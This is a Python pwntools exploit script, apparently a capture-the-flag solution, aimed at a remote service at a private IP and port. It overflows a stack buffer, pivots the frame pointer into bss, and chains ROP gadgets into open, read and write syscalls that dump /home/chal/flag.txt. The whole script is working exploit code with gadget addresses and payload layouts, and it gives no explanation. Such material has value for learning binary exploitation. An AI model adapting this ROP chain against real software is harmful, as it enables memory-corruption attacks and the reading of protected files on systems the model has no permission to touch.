from pwn import *
from time import sleep

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

# 0000000000401cd5 <main>:
# 0x0000000000448d27 : pop rax ; ret
# 0x0000000000401832 : pop rdi ; ret
# 0x000000000040f01e : pop rsi ; ret
# 0x000000000040173f : pop rdx ; ret
# 0x00000000004012d3 : syscall
# 0x0000000000448280 : syscall ; *** ; ret
# 0x0000000000401cfc : leave ; ret
# 0x000000000040f01b : pop r13 ; pop r14 ; ret
# 0x000000000040182d : pop r13 ; pop r14 ; pop r15 ; ret
# read 0
# write 1
# open 2

bss1 = 0x4C3020
bss2 = bss1 + 0x100

buf = bss1 - 0x820


def main():
    r = remote("10.113.184.121", 10054)
    # r = process("./share/chal")
    # attach(
    #     r,
    #     """
    #     br main
    #     """,
    # )

    payload = flat(
        {
            0x20: [
                bss1,  # rbp
                0x0000000000401CD5 + 12,  # <main+12>
            ]
        }
    )
    # print(payload)
    r.sendline(payload)
    sleep(0.1)

    payload = flat(
        [
            [b"/home/chal/flag.txt".ljust(0x20, b"\x00")],
            bss2,  # rbp # bss
            # open
            [0x0000000000448D27, 2],  # pop rax ; ret  # open
            [0x0000000000401832, bss1 - 0x20],  # pop rdi ; ret  # file
            [0x000000000040F01E, 0x0000000000000000],  # pop rsi ; ret  # flag
            [0x000000000040173F, 0x0000000000000000],  # pop rdx ; ret  # flag
            0x0000000000448280,  # syscall ; *** ; ret
            0x0000000000401CD5 + 12,  # ra <main+12>
        ]
    )
    # print(payload)
    r.sendline(payload)
    sleep(0.1)

    payload = flat(
        [
            [0, 0, 0, 0],
            bss1,  # rbp
            # read
            [0x0000000000448D27, 0],  # pop rax ; ret  # read
            [0x0000000000401832, 3],  # pop rdi ; ret  # fd
            [0x000000000040F01E, buf],  # pop rsi ; ret  # buf
            [0x000000000040173F, 0x100],  # pop rdx ; ret  # size
            0x0000000000448280,  # syscall ; *** ; ret
            0x0000000000401CD5 + 12,  # <main+12>
        ]
    )
    # print(payload)
    r.sendline(payload)
    sleep(0.1)

    payload = flat(
        [
            [0, 0, 0, 0],
            bss2,  # rbp
            # write
            [0x0000000000448D27, 1],  # pop rax ; ret  # write
            [0x0000000000401832, 1],  # pop rdi ; ret  # fd
            [0x000000000040F01E, buf],  # pop rsi ; ret  # buf
            [0x000000000040173F, 0x100],  # pop rdx ; ret  # size
            0x0000000000448280,  # syscall ; *** ; ret
            0x0000000000401CD5 + 12,  # <main+12>
            0,
        ]
    )
    # print(payload)
    r.sendline(payload)
    sleep(0.1)
    ret = r.recvline()
    print(ret.decode().strip())


if __name__ == "__main__":
    main()
